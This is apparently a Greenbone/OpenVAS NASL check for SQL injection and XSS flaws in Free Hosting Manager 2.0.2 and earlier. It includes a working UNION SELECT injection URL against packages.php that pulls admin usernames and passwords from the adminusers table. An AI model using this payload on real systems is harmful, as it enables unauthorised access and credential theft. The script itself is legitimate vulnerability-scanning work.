# SPDX-FileCopyrightText: 2013 Greenbone AG
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.803446");
  script_version("2024-06-06T05:05:36+0000");
  script_tag(name:"last_modification", value:"2024-06-06 05:05:36 +0000 (Thu, 06 Jun 2024)");
  script_tag(name:"creation_date", value:"2013-03-25 14:43:46 +0530 (Mon, 25 Mar 2013)");
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");

  script_tag(name:"qod_type", value:"remote_app");

  script_tag(name:"solution_type", value:"WillNotFix");

  script_name("Free Hosting Manager <= 2.0.2 Multiple Vulnerabilities - Active Check");

  script_category(ACT_ATTACK);

  script_copyright("Copyright (C) 2013 Greenbone AG");
  script_family("Web application abuses");
  script_dependencies("find_service.nasl", "no404.nasl", "webmirror.nasl", "DDI_Directory_Scanner.nasl", "gb_php_http_detect.nasl", "global_settings.nasl");
  script_require_ports("Services/www", 80);
  script_exclude_keys("Settings/disable_cgi_scanning");

  script_tag(name:"summary", value:"Free Hosting Manager is prone to multiple vulnerabilities.");

  script_tag(name:"vuldetect", value:"Sends a crafted HTTP GET request and checks the response.");

  script_tag(name:"insight", value:"The following flaws exist:

  - The packages.php, tickets.php, viewaccount.php, reset.php scripts are not properly sanitizing
  user-supplied input to the 'id' and 'code' parameters.

  - Input passed via POST parameter to home.php and register.php scripts is not properly sanitizing
  before being used in a SQL query.

  - Input passed via ticket field is not properly sanitizing before being returned to the user.");

  script_tag(name:"impact", value:"Successful exploitation will allow remote attackers to inject or
  manipulate SQL queries in the back-end database, allowing for the manipulation or disclosure of
  arbitrary data and execute arbitrary HTML or web script in a user's browser session in context of
  an affected site.");

  script_tag(name:"affected", value:"Free Hosting Manager version 2.0.2 and prior.");

  script_tag(name:"solution", value:"No known solution was made available for at least one year
  since the disclosure of this vulnerability. Likely none will be provided anymore. General solution
  options are to upgrade to a newer release, disable respective features, remove the product or
  replace the product by another one.");

  script_xref(name:"URL", value:"http://xforce.iss.net/xforce/xfdb/80728");
  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/56754");
  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/56991");
  script_xref(name:"URL", value:"http://www.exploit-db.com/exploits/23028");
  script_xref(name:"URL", value:"http://packetstormsecurity.com/files/118934");

  exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");
include("port_service_func.inc");
include("list_array_func.inc");

port = http_get_port(default: 80);

if (!http_can_host_php(port: port))
  exit(0);

foreach dir (make_list_unique("/", "/freehostingmanager", "/fhm", http_cgi_dirs(port: port))) {
  if (dir == "/")
    dir = "";

  res = http_get_cache(item: dir + "/admin/login.php", port: port);
  if (!res || res !~ "^HTTP/1\.[01] 200" || "Free Hosting Manager<" >!< res)
    continue;

  url = dir + "/clients/packages.php?id=-1'+UNION+ALL+SELECT+1,CONCAT(username,char(58),password),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19+from+adminusers%23";

  if (http_vuln_check(port: port, url: url, check_header: TRUE,
                      pattern:"<title>.*:.* - Advanced Package Details",
                      extra_check: make_list(">Feature<", ">Limit<", ">Email Accounts<"))) {
    report = http_report_vuln_url(port: port, url: url);
    security_message(port: port, data: report);
    exit(0);
  }
}

exit(99);
